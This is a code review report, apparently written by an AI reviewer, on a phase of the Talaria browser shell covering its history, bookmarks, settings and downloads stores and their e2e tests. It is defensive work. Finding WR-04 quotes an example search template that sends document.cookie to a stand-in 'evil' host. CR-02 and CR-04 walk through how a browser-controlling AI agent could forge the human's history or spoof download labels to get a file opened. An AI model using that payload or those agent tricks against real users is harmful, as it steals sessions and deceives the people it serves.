---
phase: 03-table-stakes-browsing
reviewed: 2026-08-20T00:00:00Z
depth: deep
files_reviewed: 12
files_reviewed_list:
  - crates/talaria-shell/src/history.rs
  - crates/talaria-shell/src/bookmarks.rs
  - crates/talaria-shell/src/settings.rs
  - crates/talaria-shell/src/downloads.rs
  - crates/talaria-shell/src/app.rs
  - crates/talaria-shell/src/gui.rs
  - crates/talaria-shell/src/main.rs
  - tests/e2e/history_test.py
  - tests/e2e/bookmarks_test.py
  - tests/e2e/downloads_list_test.py
  - tests/e2e/run_all.py
  - tests/e2e/vault_ui_test.py
findings:
  critical: 4
  warning: 8
  info: 6
  total: 18
status: issues_found
---

# Phase 3: Code Review Report

**Reviewed:** 2026-08-20
**Depth:** deep (cross-file: agent command dispatch → tab table → history store; download thread → event proxy → store → panel → `process::Command`)
**Files Reviewed:** 12
**Status:** issues_found

## Summary

Four new store modules, four new chrome panels, one new cross-thread event, and one
`resolve_location` signature change. The three items the brief flagged as highest risk all
hold up under independent tracing:

- **The opener chain is correctly constrained.** `UiAction::OpenDownload` is constructed at
  exactly one site (`gui.rs:1207`, the Downloads panel's Open button), carries
  `DownloadEntry::path` cloned verbatim, and that string originates from `create_unique`'s
  return value via `AppEvent::DownloadCompleted` (`app.rs:1774`). Nothing in
  `talaria-protocol` or `talaria-mcp` carries a variant that reaches it — verified by grep
  across both crates. `Command::new("xdg-open").arg(&path)` does not go through a shell, so
  there is no command injection, and every recorded path is `download_dir().join(filename)`
  with `filename` already rejected for `/` and `..`, so it always carries a `/` or `./`
  prefix and cannot be read as an option by `xdg-open`.
- **The cross-thread plumbing is correct.** `state.event_proxy.clone()` happens at
  `app.rs:1754`, *before* `std::thread::spawn`; only `proxy`, `url`, `filename` and `reply`
  cross the boundary, so no `Rc<Shared>` is moved. The completion event is applied only in
  `user_event`'s `DownloadCompleted` arm on the main loop, and a closed proxy is swallowed
  with `let _ =`.
- **`resolve_location` is behaviourally unchanged above the fallback**, and pinned by a test
  that asserts URL-shaped inputs resolve identically under two different engines. A
  malformed `config.json` degrades to the default at three separate layers.

What follows is what does *not* hold up. Two of the four criticals are cross-module facts
that no single plan was positioned to see: an agent can write into the human's history
through a tab it does not own, and none of the four new plaintext stores set the owner-only
permissions their own module headers cite as their reason for not encrypting.

---

## Critical Issues

### CR-01: A page's `<title>` can panic the whole browser — and this phase built the fix and did not apply it

**File:** `crates/talaria-shell/src/gui.rs:705`, `crates/talaria-shell/src/gui.rs:742`

**Issue:** The tab strip truncates a page title with `String::truncate`, which takes a
**byte** index and **panics** when that index does not land on a `char` boundary:

```rust
let mut label = tab.webview.page_title()...unwrap_or_else(|| tab.location.clone());
label.truncate(28);   // gui.rs:705  — panics on a multibyte title
...
title.truncate(24);   // gui.rs:742  — same, in the Agents strip
```

`"日"` is three bytes, so a title of ten of them is 30 bytes and byte 28 is mid-character:
the egui closure panics, and it is on the main thread inside the render pass, so it takes
the browser down. **Any website can trigger this by setting its own `<title>`**, and an
agent can trigger it deliberately via `tabs_open` on a `data:` URL — an unauthenticated
remote crash of the entire application, including every other tab and every agent session.

These two lines are pre-existing (`202cbb97`, 2026-08-15), but they are squarely this
review's business: plan 03-01 added `truncate_chars` (`gui.rs:121`) *specifically because
`String::truncate` panics on multibyte input*, documented that in the helper's doc comment,
wrote `truncation_counts_characters_not_bytes` to pin it, applied it to all three new panels
— and left the two live panic sites 300 lines above it in the same file untouched. The
diagnosis was made and not acted on.

**Fix:** Use the helper that already exists.

```rust
// gui.rs:701-705
let mut label = truncate_chars(
    &tab.webview
        .page_title()
        .filter(|t| !t.is_empty())
        .unwrap_or_else(|| tab.location.clone()),
    28,
);

// gui.rs:738-742
let title = truncate_chars(
    &tab.webview
        .page_title()
        .filter(|t| !t.is_empty())
        .unwrap_or_else(|| tab.location.clone()),
    24,
);
```

Then add a regression test that renders a tab-strip label from a CJK title, and grep the
crate for any remaining `.truncate(` on a `String` built from page-controlled text.

---

### CR-02: An agent can write into the human's browsing history, and the panel tells the human it cannot

**Files:** `crates/talaria-shell/src/app.rs:369-393` (the drain), `crates/talaria-shell/src/app.rs:1608-1618` (`Command::Navigate`), `crates/talaria-shell/src/app.rs:1541-1548` (`webview_for`), `crates/talaria-shell/src/gui.rs:1000-1003` (the panel's copy), `crates/talaria-shell/src/history.rs:18-20` (the module's claim)

**Issue:** The Me-only filter is applied to the **tab's owner**, not to **who caused the
navigation**:

```rust
// app.rs:381
if !matches!(tab.owner, TabOwner::Me) {
    continue;
}
```

But `webview_for` (`app.rs:1541`) resolves *any* tab id regardless of owner, and
`Command::TabsList` (`app.rs:1564`) enumerates *all* tabs including the human's. So the
full agent-reachable write path is:

1. `tabs_list` → returns the human's own Me tabs;
2. `navigate { tab_id: <a Me tab>, url: "https://attacker.example/" }` → `webview.load(url)`;
3. Servo fires `LoadStatus::Complete` → `HistoryWrite { tab_id }` queued (`app.rs:2229`);
4. the drain sees `TabOwner::Me`, passes the filter, and appends the row.

`evaluate` on a Me tab (`location.href = ...`) is a second route to the same place. The
result is that an agent can inject arbitrary URLs into `history.jsonl` indistinguishable
from pages the human actually visited, and can do so silently.

This directly falsifies three statements shipped in this phase:

- the History panel's own copy (`gui.rs:1000`): *"Pages you visited in your own tabs. What
  an agent browses is not recorded here."*
- `history.rs:18-20`: *"An agent-owned tab's navigation never reaches this module"* — true
  as written, and irrelevant, because the agent does not need to own the tab.
- `03-01`'s e2e coverage tests only the `tabs_open` case (`history_test.py:186-196`, an
  agent-*owned* tab). The `navigate`-a-Me-tab case is untested.

Severity is Critical rather than Warning because history is a record a human reasons about
("did I go there?"), and a forged row is both a false accusation and a laundering channel
for a URL the agent wants the human to trust and click. `UiAction::Go` on a history row
navigates straight to it.

**Fix:** Filter on provenance, not ownership. Mark the navigation, not the tab:

```rust
// tabs.rs — add to Tab
/// Set when the last load on this tab was started by a control-socket
/// command rather than by the human. Cleared by every human-initiated
/// navigation (UiAction::Go / Back / Forward / Reload).
pub agent_driven_load: bool,

// app.rs, Command::Navigate arm (~1611) and the evaluate arm
if let Some(tab) = state.tabs.borrow_mut().get_mut(tab_id) {
    tab.agent_driven_load = true;
    ...
}

// app.rs:381, the drain
if !matches!(tab.owner, TabOwner::Me) || tab.agent_driven_load {
    continue;
}
```

Add an e2e case: `open_for_user` a Me tab, then `navigate` it from an agent session, then
assert the row count is unchanged. If the decision instead goes the other way — record it
but attribute it — then the panel copy at `gui.rs:1000` must be corrected in the same change,
because it is currently false.

---

### CR-03: All four new stores are written world-readable, contradicting the reason each gives for storing plaintext

**Files:** `crates/talaria-shell/src/history.rs:159`, `crates/talaria-shell/src/history.rs:226`, `crates/talaria-shell/src/bookmarks.rs:203`, `crates/talaria-shell/src/settings.rs:218`, `crates/talaria-shell/src/downloads.rs:236` (and every `fs::create_dir_all` beside them)

**Issue:** Every new store creates its file with `fs::write` or
`OpenOptions::new().append(true).create(true)`, both of which use mode `0666 & !umask` —
`0644` under the default `umask 022`. `create_dir_all` leaves the `talaria` config directory
at `0755`. Nothing anywhere in the four new modules calls `set_permissions`.

Each module justifies not encrypting on exactly this ground:

- `history.rs:8-10` — *"encrypting it would buy nothing the surrounding file permissions do
  not already provide"*
- `bookmarks.rs:9-10` — the same sentence.

The surrounding file permissions provide nothing. `history.jsonl` — the complete plaintext
record of every URL the human visited, including query strings that routinely carry session
tokens, reset links and search terms — is readable by every local account, as are the
bookmark list and the list of downloaded file paths. The stated premise is false, so the
conclusion drawn from it does not stand.

This is not an unknown pattern in the codebase. `vault.rs:93` chmods `0o600` after writing,
and `control.rs:115` chmods the socket `0o600`. The house pattern exists; the four new
modules did not follow it.

**Fix:** Chmod every store file (and the staging sibling, which is written first and may be
read before the rename) and tighten the directory. Add to each module, matching `vault.rs`:

```rust
#[cfg(unix)]
fn restrict(path: &std::path::Path) {
    use std::os::unix::fs::PermissionsExt;
    if let Err(error) = fs::set_permissions(path, fs::Permissions::from_mode(0o600)) {
        log::warn!("could not restrict {}: {error}", path.display());
    }
}
```

Call it immediately after `fs::write(&staged, ..)` and after the `OpenOptions` create in
`History::append`, and set the directory to `0o700` where it is created. Better still: hoist
this into one place, since four copies of a security control is four chances to forget the
fifth. Then update the two module headers so the justification matches what the code now
actually does.

---

### CR-04: The Downloads panel offers one-click OS handoff of an agent-written file, with no provenance and an agent-chosen label

**Files:** `crates/talaria-shell/src/app.rs:41-46` (`AppEvent::DownloadCompleted`), `crates/talaria-shell/src/downloads.rs:8-14`, `crates/talaria-shell/src/gui.rs:1186` (the label), `crates/talaria-shell/src/gui.rs:1203-1211` (the Open button)

**Issue:** `AppEvent::DownloadCompleted` deliberately carries **no owner field**
(`app.rs:33-40`), and `DownloadEntry` deliberately has **no owner column**
(`downloads.rs:12-14`). The stated reason — that a file on the human's disk matters whoever
caused it — is sound for *listing* the row. It is not sound for the affordance that was
built on top of it: a button that hands the file to the OS's default application.

The resulting composition:

- an agent chooses the URL, so it chooses the file's **bytes**;
- an agent chooses `filename`, so it chooses the **extension** — and therefore which
  application `xdg-open` dispatches to (`.pdf` → a PDF renderer, `.html` → the default
  browser with a `file://` origin, `.desktop` → the desktop's `.desktop` handler);
- an agent chooses `filename`, so it also chooses the **entire visible label** of the row
  (`gui.rs:1186`: `truncate_chars(&entry.filename, 60)`). `filename` is validated only for
  `/` and `..` (`app.rs:1746`), so it may contain newlines, tabs, and Unicode bidi
  overrides. A filename of `"invoice.pdf\n\nSafe — from your bank"` renders as two lines in
  the panel;
- the panel shows nothing whatsoever to distinguish that row from a file the human
  downloaded themselves.

Phase 2's SEC-01/SEC-02 spent their scope removing the agent's route to arbitrary local
execution. This phase re-adds a route to it that is one human click long, and removes the
one piece of information — who asked for this — that would let the human decline.

**Fix:** Two changes, both small:

1. **Carry the provenance.** Add `requested_by: Option<String>` to
   `AppEvent::DownloadCompleted` and `DownloadEntry` (the client label already on
   `Session`, `None` for a human-initiated download). Render it on the row, and consider
   degrading the button to "Show in folder" (`xdg-open` on the *parent directory*) for
   agent-requested rows, so the file is reachable without the browser dispatching it.
   `from_json` already degrades missing fields, so old `downloads.json` files load
   unchanged.
2. **Sanitize the label.** The displayed filename must not carry control characters:

   ```rust
   // gui.rs, before truncate_chars
   let safe: String = entry
       .filename
       .chars()
       .map(|c| if c.is_control() || matches!(c, '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}') { '\u{FFFD}' } else { c })
       .collect();
   let label = truncate_chars(&safe, 60);
   ```

   Tighten `Command::Download`'s validation at `app.rs:1746` to reject control characters in
   `filename` outright, alongside the existing `/` and `..` checks.

---

## Warnings

### WR-01: The `xdg-open` child is never reaped and inherits the browser's stdio

**File:** `crates/talaria-shell/src/app.rs:1377`

**Issue:** `Command::new("xdg-open").arg(&path).spawn()` returns a `Child` that is dropped
immediately. Rust's `Child::drop` does **not** wait, so on Linux every Open leaves a zombie
process in the table for the lifetime of the browser — a long session that opens downloads
repeatedly accumulates them until the process table entry limit bites. The comment at
`app.rs:1378-1381` explains why the handler is not *blocked on*, which is correct, but "do
not block" and "never reap" are different decisions and only the first was made
deliberately.

Separately, the child inherits the shell's stdin/stdout/stderr, so a chatty handler writes
into the browser's own log stream, and a handler that reads stdin competes with the browser
for the terminal.

**Fix:**

```rust
match std::process::Command::new("xdg-open")
    .arg(&path)
    .stdin(std::process::Stdio::null())
    .stdout(std::process::Stdio::null())
    .stderr(std::process::Stdio::null())
    .spawn()
{
    Ok(child) => {
        // Reaped off the main thread: the handler is a whole application and
        // must not be waited on from the event loop.
        std::thread::spawn(move || { let mut child = child; let _ = child.wait(); });
    },
    Err(error) => { ... }
}
```

### WR-02: `xdg-open` is hardcoded, so the Downloads panel's Open button is Linux-only

**File:** `crates/talaria-shell/src/app.rs:1377`

**Issue:** `CLAUDE.md` names Linux the *de-facto current* baseline while keeping macOS in
scope, and `keyring` is already configured with `apple-native` and `windows-native`
features. On macOS and Windows `xdg-open` does not exist, so every Open fails with
`NoSuchFileException` and the panel shows "Couldn't open X — No such file or directory",
which reads as though the *download* is missing rather than the opener. The failure mode is
actively misleading.

**Fix:** cfg-gate the opener and keep the error message about the opener:

```rust
#[cfg(target_os = "linux")]
const OPENER: &str = "xdg-open";
#[cfg(target_os = "macos")]
const OPENER: &str = "open";
#[cfg(target_os = "windows")]
const OPENER: &str = "explorer";
```

### WR-03: The history drain neither dedupes nor snapshots, so two loads in one iteration produce two rows for the same page and lose the first

**File:** `crates/talaria-shell/src/app.rs:369-393`

**Issue:** `notify_load_status_changed` queues `HistoryWrite { tab_id }` with no URL
(`app.rs:2229`), and the drain reads `tab.webview.url()` fresh at drain time
(`app.rs:385`). The doc comment at `app.rs:104-106` justifies this for the *title*, which is
fair — but it also means the drain loop:

```rust
for write in writes {
    let Some(tab) = tabs.get(write.tab_id) else { continue };
    ...
    let Some(url) = tab.webview.url() else { continue };
    history.append(url.to_string(), title, now_ms());
}
```

does not dedupe on `tab_id`. When two `Complete` events for one tab land in the same
event-loop iteration — a redirect, or an initial blank document followed immediately by the
real page — both queued writes read the *same, latest* URL. The result is one duplicated
row for the current page and one silently dropped visit for the previous one. The
`about:blank` guard (`app.rs:386`) does not help, because by drain time `url()` no longer
returns `about:blank`.

**Fix:** Collapse to the last write per tab in the drain:

```rust
let mut writes: Vec<HistoryWrite> = self.pending_history_writes.borrow_mut().drain(..).collect();
// One row per tab per drain: two Completes in one iteration describe one
// end state, and the drain reads that state once.
let mut seen = std::collections::BTreeSet::new();
writes.reverse();
writes.retain(|write| seen.insert(write.tab_id));
```

Or, if per-navigation fidelity is wanted, capture `url` in `HistoryWrite` at push time and
read only the title at drain time.

### WR-04: `is_valid_template` accepts `javascript:`, `file:` and `data:` templates, undoing `resolve_location`'s deliberate `data:` refusal

**File:** `crates/talaria-shell/src/settings.rs:109-111`

**Issue:** The whole of template validation is:

```rust
pub fn is_valid_template(template: &str) -> bool {
    template.matches("{query}").count() == 1
}
```

No scheme check, at the Save gate (`gui.rs:1327`) or at load (`settings.rs:175`). So
`javascript:fetch('https://evil/'+document.cookie)//{query}` and `file:///etc/{query}` are
both saveable and both persist across restarts, after which *every* non-URL thing the human
types into the address bar navigates the current tab to them.

The codebase already reasons about exactly this attack in the opposite direction: `data:`
is deliberately refused from the address bar because "the paste-this-into-your-address-bar
attack makes the human a courier for someone else's payload"
(`app.rs:1600-1612`, `deferred-items.md`). A settings field that accepts an arbitrary
scheme is the same attack with one more step and a much longer persistence — "paste this
into your search settings" is a well-known real-world browser attack. The asymmetry with
the `data:` decision runs the wrong way.

**Fix:** Validate what the template resolves to, not just its shape:

```rust
pub fn is_valid_template(template: &str) -> bool {
    if template.matches("{query}").count() != 1 {
        return false;
    }
    // The template must resolve to a web URL. Anything else — javascript:,
    // file:, data: — is a payload wearing a search engine's clothes, and the
    // address bar refuses those from the human for the same reason.
    matches!(
        url::Url::parse(&template.replacen("{query}", "probe", 1)),
        Ok(url) if matches!(url.scheme(), "http" | "https")
    )
}
```

`url` is already a dependency of `talaria-shell`. This tightens both the Save gate and
`Settings::load`'s validation, since both call this function. Note that `resolve_location`'s
own `Url::parse` fallback (`app.rs:1511`) does *not* catch these — `javascript:` and
`file:` parse successfully.

### WR-05: The search query is always form-encoded, so a path-position `{query}` produces `+` instead of `%20`

**File:** `crates/talaria-shell/src/app.rs:1503-1504`

**Issue:** `url::form_urlencoded::byte_serialize` encodes a space as `+`, which is correct
in a query string and wrong everywhere else. The Settings panel invites any template, and
path-position templates are common — `https://en.wikipedia.org/wiki/{query}` is the obvious
one. Searching for `alan turing` produces `https://en.wikipedia.org/wiki/alan+turing`, a
literal plus in the path, which Wikipedia treats as a different (missing) article. The user
sees a broken engine and has nothing to diagnose it with, since the panel accepted the
template.

**Fix:** Either encode for the general case:

```rust
let query: String = url::form_urlencoded::byte_serialize(input.as_bytes())
    .collect::<String>()
    .replace('+', "%20");
```

(`%20` is valid in both a path and a query string, so this is correct for every position),
or state the constraint in the panel's helper text at `gui.rs:1315` — currently just "Must
contain {query} exactly once".

### WR-06: `TALARIA_HISTORY_MAX_ENTRIES=0` silently deletes the entire history at every startup

**File:** `crates/talaria-shell/src/history.rs:100-103`, `crates/talaria-shell/src/history.rs:201-234`

**Issue:** `parse_max_entries` maps `"0"` to `0usize` — it parses successfully, so the
fallback does not fire. `prune_to(0)` then does `self.entries.split_off(before - 0)`, which
leaves the vector empty, and rewrites `history.jsonl` as an empty file. A user who reads
`TALARIA_HISTORY_MAX_ENTRIES` as a limit and sets it to `0` meaning "no limit" gets the
exact opposite: unrecoverable deletion of their entire browsing history, on every launch,
with only a `log::warn!` nobody sees.

The guard test `an_unparseable_cap_falls_back_to_the_default_not_to_zero`
(`history.rs:481`) covers `"lots"`, `"-1"` and `""` — and its name says "not to zero" —
but does not cover the literal `"0"`, which is the one input that actually reaches zero.

**Fix:** Reject zero explicitly and say why:

```rust
fn parse_max_entries(raw: Option<String>) -> usize {
    // Zero is refused rather than honoured: it reads as "no limit" and would
    // mean "delete everything", and no caller wants that by accident. Use
    // the History panel's Clear button to clear history.
    raw.and_then(|value| value.parse::<usize>().ok())
        .filter(|entries| *entries > 0)
        .unwrap_or(DEFAULT_MAX_HISTORY_ENTRIES)
}
```

and extend the test to assert `parse_max_entries(Some("0".into())) == DEFAULT_MAX_HISTORY_ENTRIES`.

### WR-07: Clicking a history or bookmark row re-runs `resolve_location`, so a non-`http(s)` stored URL is sent to the search engine instead of reopened

**File:** `crates/talaria-shell/src/gui.rs:1032`, `crates/talaria-shell/src/gui.rs:1114`

**Issue:** Both row-click handlers push `UiAction::Go(entry.url.clone())`, and `Go`
(`app.rs:1246`) runs the string back through `resolve_location`, which only returns a parsed
URL when it has a host or its scheme is `about`/`file`. A stored `blob:https://…/uuid` URL
has no host; the second branch tries `https://blob:https://…` which fails to parse; so the
whole stored URL is form-encoded and handed to the search engine. The row does not reopen
the page — it performs a web search, and in doing so **transmits the stored URL to a third
party**.

These strings are already resolved URLs. Round-tripping them through the omnibox heuristic
is unnecessary and only introduces ways for them to be reinterpreted.

**Fix:** Add a `UiAction::GoUrl(Url)` (or reuse the existing navigate path) that loads the
already-parsed URL directly:

```rust
UiAction::GoUrl(url) => {
    let mut tabs = state.tabs.borrow_mut();
    if let Some(tab) = tabs.displayed_mut() {
        tab.location = url.to_string();
        tab.location_dirty = false;
        tab.crashed = false;
        tab.webview.load(url);
    }
    state.window.request_redraw();
},
```

and have the two panels parse `entry.url` once, skipping the row's click handler if it does
not parse.

### WR-08: `vault_ui_test.py`'s hardcoded toolbar coordinate broke four times in four plans and is still hardcoded

**File:** `tests/e2e/vault_ui_test.py:53-77`

**Issue:** `CREDENTIALS_BUTTON = ("399", "11")` is a raw logical point. It broke in 03-01
(239→283), 03-02 (283→341), 03-03 (341→370) and 03-04 (370→399). Each break surfaced as a
red suite, and each was fixed by temporarily editing `gui.rs` to log a rect — a manual,
undocumented-until-the-third-time procedure now enshrined in a 24-line comment. The comment
itself concedes the fifth occurrence will pay the cost again.

This is test-reliability debt, in scope for review: the suite is not pinning what it claims
to pin (it pins a coordinate, not "the credentials toolbar button"), and it will fail for a
reason unrelated to the behaviour under test the next time any toolbar control is added or
any icon font metric changes.

**Fix:** Take the second option `deferred-items.md` already identifies — expose the button's
rect behind `TALARIA_TEST_HOOKS=1` and have the suite look it up. That preserves the
toolbar-button coverage the docstring claims, unlike switching to Ctrl+K, and costs one
test-only field on `Shared` that the existing `TALARIA_TEST_HOOKS` gate already establishes
a precedent for.

---

## Info

### IN-01: `human_bytes` reports 1,048,575 bytes as "1024.0 KB"

**File:** `crates/talaria-shell/src/gui.rs:151-165`

The unit is chosen from the raw byte count before rounding, so values just under a boundary
render as "1024.0 KB" and "1024.0 MB" rather than rolling to the next unit. The test at
`gui.rs:1442` asserts the current behaviour, which turns a cosmetic bug into a pinned one.
Fix: compare the *rounded* value, or pick the unit from `bytes.ilog2() / 10`.

### IN-02: Ctrl+J is implemented but absent from the shortcut doc comment

**File:** `crates/talaria-shell/src/app.rs:1078-1083`, handler at `app.rs:1099`

The doc comment lists Ctrl+H, Ctrl+B and Ctrl+D but not Ctrl+J (Downloads panel). Add it —
this comment is the only inventory of the shortcut surface.

### IN-03: `impl Default for Settings` is dead

**File:** `crates/talaria-shell/src/settings.rs:127-131`

`Settings::default()` has no caller; only the private `defaults_at` is used. A trait impl is
never flagged by dead-code analysis, so this will not surface on its own. Remove it, or use
it from `load_from`'s three fallback sites.

### IN-04: The CLI startup path always searches DuckDuckGo, never the configured engine

**File:** `crates/talaria-shell/src/main.rs:32-41`

`talaria "some search terms"` uses `SearchEngine::default()` because no `Shared` exists yet.
The reasoning is recorded in the call site's comment and is defensible, but it means one
user-visible path silently ignores a setting the Settings panel says applies. Either read
`config.json` here (`Settings::load()` is cheap and already degrades on every failure) or
say so in the panel's copy.

### IN-05: `Downloads::save` leaves a stale `.tmp` on rename failure while its two siblings clean up

**File:** `crates/talaria-shell/src/downloads.rs:240-252`

The 12-line justification — that this module must contain no call that deletes a file, so
the lever cannot be reached for by mistake — does not survive the fact that `fs::rename` and
`fs::write` are both present three lines above and are equally capable of destroying an
arbitrary path. The residue is harmless (overwritten by the next save, never read as data),
but the divergence from `bookmarks.rs:209` and `settings.rs:224` costs a reader more than it
buys. Either align all three, or shorten the comment to "a stale `.tmp` is harmless and the
next save overwrites it."

### IN-06: `config_dir()` is copied verbatim into four modules

**Files:** `crates/talaria-shell/src/history.rs:87`, `bookmarks.rs:90`, `settings.rs:114`, `downloads.rs:119`

Four identical copies, each with a comment explaining that the duplication is deliberate
because "one shared helper is one more thing that has to be right for all of them at once."
CR-03 is the counterexample: the permissions control that should sit next to this helper now
has to be added in four places, and any one of them can be missed. Reconsider when fixing
CR-03.

---

_Reviewed: 2026-08-20_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_
